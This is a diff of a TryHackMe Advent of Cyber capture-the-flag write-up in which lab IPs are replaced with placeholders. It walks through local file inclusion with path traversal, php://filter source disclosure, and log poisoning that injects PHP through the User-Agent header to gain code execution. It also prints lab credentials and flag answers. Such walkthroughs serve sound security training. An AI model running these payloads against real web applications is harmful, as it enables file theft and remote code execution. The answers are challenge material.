@@ -5,7 +5,7 @@
 -   HuskyHacks. (2021). Late-Twenties Boomer Performs LFI & Log Poisoning (elf hat) | TryHackMe Advent of Cyber Day 6! [YouTube Video]. In YouTube. https://youtu.be/pGPE5uCI5h8
 
 ```bash
-$ nmap -sC -sV -vv 10.10.64.67
+$ nmap -sC -sV -vv <MACHINE_IP>
 PORT   STATE SERVICE REASON  VERSION
 22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey:
@@ -28,7 +28,7 @@ PORT   STATE SERVICE REASON  VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-`curl "http://10.10.64.67/index.php?err=../../../etc/passwd"`
+`curl "http://<MACHINE_IP>/index.php?err=../../../etc/passwd"`
 
 ```html
 <!DOCTYPE html>
@@ -118,13 +118,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## Deploy the attached VM and look around. What is the entry point for our web application?
 
--   The web page defaults to reading from `$(pwd)/error.txt`, because when requesting the root page of the website, the server redirects to `http://10.10.64.67/index.php?err=error.txt`.
+-   The web page defaults to reading from `$(pwd)/error.txt`, because when requesting the root page of the website, the server redirects to `http://<MACHINE_IP>/index.php?err=error.txt`.
 
 **Answer**: `err`
 
 ## Use the entry point to perform `LFI` to read the `/etc/flag` file. What is the flag?
 
-`curl "http://10.10.64.67/index.php?err=../../../etc/flag"`
+`curl "http://<MACHINE_IP>/index.php?err=../../../etc/flag"`
 
 ```html
 <!DOCTYPE html>
@@ -199,7 +199,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ## Use the PHP filter technique to read the source code of the `index.php`. What is the `$flag` variable's value?
 
--   `curl "http://10.10.64.67/index.php?err=php://filter/convert.base64-encode/resource=index.php"`
+-   `curl "http://<MACHINE_IP>/index.php?err=php://filter/convert.base64-encode/resource=index.php"`
 
 ```html
 <!DOCTYPE html>
@@ -303,7 +303,7 @@ if($_SESSION['username'] === $USER){
 
 ## Now that you read the `index.php`, there is a login credential PHP file's path. Use the PHP filter technique to read its content. What are the username and password?
 ```
-$ curl "http://10.10.64.67/index.php?err=php://filter/convert.base64-encode/resource=includes/creds.php"<!doctype html><html lang="en">  <head>
+$ curl "http://<MACHINE_IP>/index.php?err=php://filter/convert.base64-encode/resource=includes/creds.php"<!doctype html><html lang="en">  <head>
     <meta charset="utf-8">
     <title></title>
 
@@ -369,7 +369,7 @@ base64: invalid input
 **Answer**: `McSkidy:A0C315Aw3s0m`
 ## Use the credentials to login into the web application. Help McSkidy to recover the server's password. What is the password of the `flag.thm.aoc` server?
 1. Login with credetials
-2. Click on the **Password Recovery** link (`http://10.10.64.67/recover-password.php`)
+2. Click on the **Password Recovery** link (`http://<MACHINE_IP>/recover-password.php`)
 
 * Server Name: **`web.thm.aoc`** - Password: **`pass123`**
 * Server Name: **`ftp.thm.aoc`** - Password: **`123321`**
@@ -379,7 +379,7 @@ base64: invalid input
 ## The web application logs all users' requests, and only authorized users can read the log file. Use the LFI to gain RCE via the log file page. What is the hostname of the webserver? The log file location is at `./includes/logs/app_access.log`.
 
 ```bash
-$ curl "http://10.10.64.67/index.php?err=php://filter/convert.base64-encode/resource=includes/logs/app_access.log"
+$ curl "http://<MACHINE_IP>/index.php?err=php://filter/convert.base64-encode/resource=includes/logs/app_access.log"
 <!doctype html>
 <html lang="en">
   <head>
@@ -463,7 +463,7 @@ McSkidy:172.17.0.1:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, li
 Guest:172.17.0.1:curl/7.80.0:/index.php?err=php://filter/convert.base64-encode/resource=includes/logs/app_access.log
 ```
 
-`$ curl -A "<?php phpinfo()?>" http://10.10.64.67/index.php`
+`$ curl -A "<?php phpinfo()?>" http://<MACHINE_IP>/index.php`
 
-`http://10.10.64.67/index.php?err=includes/logs/app_access.log`
+`http://<MACHINE_IP>/index.php?err=includes/logs/app_access.log`
 **Answer** `lfi-aoc-awesome-59aedca683fff9261263bb084880c965`
